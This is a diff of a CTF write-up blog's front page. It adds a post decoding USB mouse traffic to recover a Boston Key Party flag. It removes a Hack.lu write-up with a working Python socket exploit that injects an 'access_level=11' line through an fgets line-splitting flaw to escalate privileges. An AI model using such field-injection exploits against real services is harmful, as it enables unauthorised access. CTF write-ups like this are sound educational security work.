@@ -22,10 +22,81 @@
 
             <aside id="featured" class="body">
                 <article>
-                    <h1 class="entry-title"><a href="https://johnsupercool.github.io/posts/2014/oct./24/hacklu-2014-ctf-exploit200-personnel-database/">Hack.lu 2014 <span class="caps">CTF</span> - Exploit200 Personnel&nbsp;Database</a></h1>
+                    <h1 class="entry-title"><a href="https://johnsupercool.github.io/posts/2015/mars/01/boston-key-party-2015-ctf-misc200-riverside/">Boston Key Party 2015 <span class="caps">CTF</span> - Misc200&nbsp;Riverside</a></h1>
 <footer class="post-info">
-        <abbr class="published" title="2014-10-24T21:06:00.797358+02:00">
-                Published: vendredi, 24 octobre 2014
+        <abbr class="published" title="2015-03-01T17:49:44.635612+01:00">
+                Published: dimanche, 01 mars 2015
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="https://johnsupercool.github.io/author/johncool.html">JohnCool</a>
+        </address>
+<p>In <a href="https://johnsupercool.github.io/category/writeup.html">WriteUp</a>. </p>
+<p>tags: <a href="https://johnsupercool.github.io/tag/writeup.html">writeUp</a> <a href="https://johnsupercool.github.io/tag/bkp.html">BKP</a> <a href="https://johnsupercool.github.io/tag/reverse.html">reverse</a> <a href="https://johnsupercool.github.io/tag/misc.html">misc</a> <a href="https://johnsupercool.github.io/tag/turtle.html">Turtle</a> </p>
+</footer><!-- /.post-info --><p>Hi ! Here is my write up for the Riverside challenge of the Boston Key Party 2015.
+It was labeled as a &#8220;School Bus&#8221; challenge which was a sort of the misc&nbsp;category.</p>
+<p>The description of the challenge&nbsp;was:</p>
+<div class="highlight"><pre>omg tha NSA hacked my super secret login, I caught them exfillin this pcap, am I t3h fuxxed? : 200
+</pre></div>
+
+
+<p>And we were given a 1.5M pcap file.
+A quick inspection of this capture with wireshark gives us the matter.
+It is a capture of the <span class="caps">USB</span> traffic between one host and some&nbsp;devices.</p>
+<p>The first part consists in status and description exchanges between the devices and the&nbsp;host.</p>
+<p><img src="/images/bkp_riverside_exch.png" width="750" height="431" /></p>
+<p>Whereas the second part is only about the device 12 sending &#8216;URB_INTERRUPT in&#8217; packets to the host and the host&#8217;s&nbsp;acknowledgments.</p>
+<p><img src="/images/bkp_riverside_data.png" width="750" height="431" /></p>
+<p>We have around 7600 packets of this kind, they have been sent pretty constantly, with a resolution around the millisecond.
+They are always carrying 4 bytes of&nbsp;data.</p>
+<p>Given the fact the capture is mainly constituted by those packets, I assumed that this is where we should look for the&nbsp;flag.</p>
+<p>So, what is the information exchanged in those messages?
+Well, a packet at the beginning of the file give us a hint, it&#8217;s probably a <span class="caps">USB</span>&nbsp;mouse.</p>
+<p><img src="/images/bkp_riverside_mouse.png" width="750" height="431" /></p>
+<p>Moreover, according to, <a href="http://wiki.osdev.org/Mouse_Input#USB_Mouse">link</a>, the data format and values of the packets may match a real mouse&nbsp;exchange:</p>
+<p>The second and third bytes are changing every&nbsp;time.</p>
+<p>The fourth byte is always&nbsp;null.</p>
+<p>But, the first byte doesn&#8217;t really match the formats I have found on the&nbsp;internet&#8230;</p>
+<p>After an analysis of some <span class="caps">USB</span> traffic captures of my mouse, here is the format of the&nbsp;data:</p>
+<div class="highlight"><pre>[BYTE 1] [?][?][?][?][?][?][?][L]
+[BYTE 2] [          MX          ]
+[BYTE 2] [          MY          ]
+[BYTE 4] [    NOT USED HERE     ]
+
+MX : The horizontal movement in two&#39;s complement interpretation
+MY : The vertical movement in two&#39;s complement interpretation
+L  : 1 if the left click is pressed
+</pre></div>
+
+
+<p>Now, this format seems to completely correspond to the data of the&nbsp;packets!</p>
+<p>Let&#8217;s export the capture as plain text, parse it and draw the mouse movement with Turtle and Python&nbsp;:)</p>
+<p>After a lot of fails, here are the results&nbsp;:</p>
+<p><img alt="upload_img" src="/images/bkp_riverside_firsttry.png" /></p>
+<p>The black dots correspond to the left clicks, and I have changed the pen color between the&nbsp;clicks.</p>
+<p>Do you notice the familiar&nbsp;pattern? </p>
+<p>Here is the same version with an image in the background to help&nbsp;:)</p>
+<p><img alt="upload_img" src="/images/bkp_riverside_secondtry.png" /></p>
+<p>In fact, the user was typing something with his mouse over a typewriter&nbsp;layout.</p>
+<p>To get the flag, you just have to follow the Turtle on the keyboard while it is drawing&nbsp;:)</p>
+<p>flag :&nbsp;<span class="caps">IWILLUPDATETHISONCETHECTFISOVER</span></p>
+<p>Thanks to the <span class="caps">BKP</span> team ! This was a funny chall&#8217;&nbsp;!</p><p>There are <a href="https://johnsupercool.github.io/posts/2015/mars/01/boston-key-party-2015-ctf-misc200-riverside/#disqus_thread">comments</a>.</p>                </article>
+            </aside><!-- /#featured -->
+                <section id="content" class="body">
+                    <h1>Other articles</h1>
+                    <hr />
+                    <ol id="posts-list" class="hfeed">
+
+            <li><article class="hentry">
+                <header>
+                    <h1><a href="https://johnsupercool.github.io/posts/2014/oct./25/hacklu-2014-ctf-exploit200-personnel-database/" rel="bookmark"
+                           title="Permalink to Hack.lu 2014 CTF - Exploit200 Personnel Database">Hack.lu 2014 <span class="caps">CTF</span> - Exploit200 Personnel&nbsp;Database</a></h1>
+                </header>
+
+                <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2014-10-25T00:00:00+02:00">
+                Published: samedi, 25 octobre 2014
         </abbr>
 
         <address class="vcard author">
@@ -33,154 +104,13 @@
         </address>
 <p>In <a href="https://johnsupercool.github.io/category/writeup.html">WriteUp</a>. </p>
 <p>tags: <a href="https://johnsupercool.github.io/tag/writeup.html">writeUp</a> <a href="https://johnsupercool.github.io/tag/exploit.html">exploit</a> <a href="https://johnsupercool.github.io/tag/hacklu.html">hacklu</a> </p>
-</footer><!-- /.post-info --><p>This service was some kind of home made database running on the staff servers.
+</footer><!-- /.post-info -->                <p>This service was some kind of home made database running on the staff servers.
 The goal here was to retrive some informations about the user <em>boss</em> who was supposed to be <em>level 10</em>.
 We were also given the C sources of the&nbsp;application.</p>
-<p>First we connected to this service via <em>nc</em> and played a bit with it while looking at the&nbsp;code.   </p>
-<p>What we have figured is that the database is used to store informations about users.
-The informations consist in a name, an access level and an optional description.
-The services stores each user informations into a file placed in the <em>./users</em> folder.
-Internally thoses informations are handled with a C struct&nbsp;:</p>
-<div class="highlight"><pre><span class="k">struct</span> <span class="n">userdata</span> <span class="p">{</span>
-    <span class="kt">uint32_t</span> <span class="n">hash</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">access_level</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">description</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
-<span class="p">};</span>
-</pre></div>
-
-
-<p>Here are the commands handled by the&nbsp;service.</p>
-<ul>
-<li><strong>whoami</strong> : if the user is logged, its returns its&nbsp;name.</li>
-<li><strong>user</strong> <em>username</em> : try to connect as <em>username</em>. Note, <em>username</em> should be already registered in the database.
-In this case the service will load the file and store the content into a <code>struct userdata</code> structure  and wait the user to provide a&nbsp;password.  </li>
-<li><strong>pass</strong> <em>password</em> : provide a password to the service. Supposed to be typed after the command <strong>user</strong>.<br />
-This will compute a hash of <em>password</em> then compare it with the one stored in the loaded strucure.
-If the two hashes match, the user is now considered as logged&nbsp;in.</li>
-<li><strong>register</strong> <em>username</em>:<em>pass</em>: register a new user into the database and fill the <code>struct userdata</code> structure.
-The user is also considered as logged&nbsp;in.</li>
-<li><strong>logout</strong> : if the user is logged in, this will save the <code>struct userdata</code> structure into <em>./users/username</em>.</li>
-<li><strong>whois</strong> <em>username</em> : if you are logged in, and if your <em>access_level</em> is strictly higher that the <em>username</em> level, this gives you all the informations about that&nbsp;user.</li>
-<li><strong>levelup</strong> <em>username</em> : if you are logged in, and if your <em>access_level</em> is strictly higher that the <em>username</em> level, this increments the <em>username</em>&nbsp;access_level.</li>
-<li><strong>set_description</strong> <em>desc</em> : if you are logged in this will update your description in the strucure. Note : you have to logout to apply the change to the&nbsp;file.</li>
-</ul>
-<p>So here the path was quite clear.
-We have to find the way to fool the system to have a high access_level then we can whois <em>boss</em>.</p>
-<p>Let&#8217;s have a look on a typical stored file&nbsp;:</p>
-<div class="highlight"><pre><span class="n">hash</span><span class="o">=</span><span class="mi">62062626</span>
-<span class="n">access_level</span><span class="o">=</span><span class="mi">0</span>
-<span class="n">description</span><span class="o">=</span><span class="n">Cool</span> <span class="n">description</span> <span class="n">goes</span> <span class="n">here</span>
-</pre></div>
-
-
-<p>Great ! And now how this file is read and how how the <code>struct userdata</code> is filled&nbsp;?</p>
-<div class="highlight"><pre><span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="nf">read_userfile</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">struct</span> <span class="n">userdata</span> <span class="o">*</span><span class="n">res</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">res</span><span class="p">));</span>
-    <span class="cm">/* ... */</span>
-
-    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open_userfile</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
-    <span class="cm">/* ... */</span>
-
-    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
-    <span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">f</span><span class="p">))</span> 
-    <span class="p">{</span>
-        <span class="n">rtrim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
-        <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="n">line</span><span class="p">;</span>
-        <span class="kt">char</span> <span class="o">*</span><span class="n">eqsign</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;=&#39;</span><span class="p">);</span>
-
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">eqsign</span><span class="p">)</span> 
-            <span class="k">continue</span><span class="p">;</span>
-
-        <span class="o">*</span><span class="n">eqsign</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
-
-        <span class="kt">char</span> <span class="o">*</span><span class="n">value</span> <span class="o">=</span> <span class="n">eqsign</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
-
-        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;hash&quot;</span><span class="p">))</span> 
-            <span class="n">res</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">=</span> <span class="n">atoll</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
-        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;access_level&quot;</span><span class="p">))</span> 
-            <span class="n">res</span><span class="o">-&gt;</span><span class="n">access_level</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
-        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;description&quot;</span><span class="p">))</span> 
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">description</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
-
-        <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fatal error: bad key </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s"> in config, aborting</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
-<span class="p">}</span>
-</pre></div>
-
-
-<p>So basically this parses a file by reading it line by line, &#8230; assuming that a line has less than 256 bytes.
-If the line contains more than 256 bytes, this line will be read in two&nbsp;times.</p>
-<p>However, the rest of the code expects a user description to be at most 512 bytes, and we have to control of the description with <strong>set_description</strong>.</p>
-<p>Moreover, there is no trace of what have been read so far.
-So in the file you can have an entry twice witout problem, since only the last line will be&nbsp;used.</p>
-<p>So, what could go wrong&nbsp;?</p>
-<p>Well we can make a file like that&nbsp;: </p>
-<div class="highlight"><pre><span class="n">hash</span><span class="o">=</span><span class="mi">62062626</span>
-<span class="n">access_level</span><span class="o">=</span><span class="mi">0</span>
-<span class="n">description</span><span class="o">=</span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaccess_level</span><span class="o">=</span><span class="mi">11</span>
-</pre></div>
-
-
-<p>And this will be read as it would be&nbsp;:</p>
-<div class="highlight"><pre><span class="n">hash</span><span class="o">=</span><span class="mi">62062626</span>
-<span class="n">access_level</span><span class="o">=</span><span class="mi">0</span>
-<span class="n">description</span><span class="o">=</span><span class="n"><span class="caps">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span>
-<span class="n">access_level</span><span class="o">=</span><span class="mi">11</span>
-</pre></div>
-
-
-<p>And then give the user an arbitrary&nbsp;access_level.</p>
-<p>So right now we can write an exploit.
-Here is mine for instance&nbsp;:</p>
-<div class="highlight"><pre><span class="kn">import</span> <span class="nn">socket</span>
-
-<span class="k">def</span> <span class="nf">sendAndPrint</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">buff</span><span class="p">):</span>
-    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span>
-    <span class="k">print</span> <span class="n">buff</span>
-
-<span class="n">host</span><span class="o">=</span><span class="s">&#39;wildwildweb.fluxfingers.net&#39;</span>
-<span class="n">port</span><span class="o">=</span><span class="mi">1410</span>
-
-<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
-
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-
-<span class="n">sendAndPrint</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&#39;register johnCool:iwannapwnthis&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-
-<span class="n">payloadLen</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="s">&#39;description=&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> 
-<span class="n">sendAndPrint</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&#39;set_description &#39;</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span>  <span class="n">payloadLen</span> <span class="o">+</span> <span class="s">&#39;access_level=11&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-
-<span class="n">sendAndPrint</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&#39;logout&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-
-<span class="n">sendAndPrint</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&#39;user johnCool&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-
-<span class="n">sendAndPrint</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&#39;pass iwannapwnthis&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-
-<span class="n">sendAndPrint</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">&#39;whois boss&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x0a</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-<span class="k">print</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span>
-</pre></div>
-
-
-<p>And you get the flag : <strong>flag{this_is_why_gets_is_better_than_fgets}</strong>&nbsp;.</p>
-<p>Thanks again to the fluxfingers team for this amazing <span class="caps">CTF</span>&nbsp;!</p><p>There are <a href="https://johnsupercool.github.io/posts/2014/oct./24/hacklu-2014-ctf-exploit200-personnel-database/#disqus_thread">comments</a>.</p>                </article>
-            </aside><!-- /#featured -->
-                <section id="content" class="body">
-                    <h1>Other articles</h1>
-                    <hr />
-                    <ol id="posts-list" class="hfeed">
+<p>First we connected to this service via ...</p>
+                <a class="readmore" href="https://johnsupercool.github.io/posts/2014/oct./25/hacklu-2014-ctf-exploit200-personnel-database/">read more</a>
+<p>There are <a href="https://johnsupercool.github.io/posts/2014/oct./25/hacklu-2014-ctf-exploit200-personnel-database/#disqus_thread">comments</a>.</p>                </div><!-- /.entry-content -->
+            </article></li>
 
             <li><article class="hentry">
                 <header>
@@ -190,7 +120,7 @@ Here is mine for instance&nbsp;:</p>
 
                 <div class="entry-content">
 <footer class="post-info">
-        <abbr class="published" title="2014-10-24T21:05:47.874468+02:00">
+        <abbr class="published" title="2014-10-24T00:00:00+02:00">
                 Published: vendredi, 24 octobre 2014
         </abbr>
 
@@ -208,14 +138,14 @@ We were given the code of the application and we were supposed to retrieve the f
 
             <li><article class="hentry">
                 <header>
-                    <h1><a href="https://johnsupercool.github.io/posts/2014/oct./24/under-construction/" rel="bookmark"
+                    <h1><a href="https://johnsupercool.github.io/posts/2014/oct./22/under-construction/" rel="bookmark"
                            title="Permalink to Under Construction">Under&nbsp;Construction</a></h1>
                 </header>
 
                 <div class="entry-content">
 <footer class="post-info">
-        <abbr class="published" title="2014-10-24T21:05:38.651451+02:00">
-                Published: vendredi, 24 octobre 2014
+        <abbr class="published" title="2014-10-22T00:00:00+02:00">
+                Published: mercredi, 22 octobre 2014
         </abbr>
 
         <address class="vcard author">
@@ -229,8 +159,8 @@ We were given the code of the application and we were supposed to retrieve the f
 <p>So please be&nbsp;patient.</p>
 <p>And here is a cookie for testing purposes :
 <img alt="Alt text" src="/images/cookie.png" title="Mhh Cookies" /></p>
-                <a class="readmore" href="https://johnsupercool.github.io/posts/2014/oct./24/under-construction/">read more</a>
-<p>There are <a href="https://johnsupercool.github.io/posts/2014/oct./24/under-construction/#disqus_thread">comments</a>.</p>                </div><!-- /.entry-content -->
+                <a class="readmore" href="https://johnsupercool.github.io/posts/2014/oct./22/under-construction/">read more</a>
+<p>There are <a href="https://johnsupercool.github.io/posts/2014/oct./22/under-construction/#disqus_thread">comments</a>.</p>                </div><!-- /.entry-content -->
             </article></li>
                 </ol><!-- /#posts-list -->
                 </section><!-- /#content -->
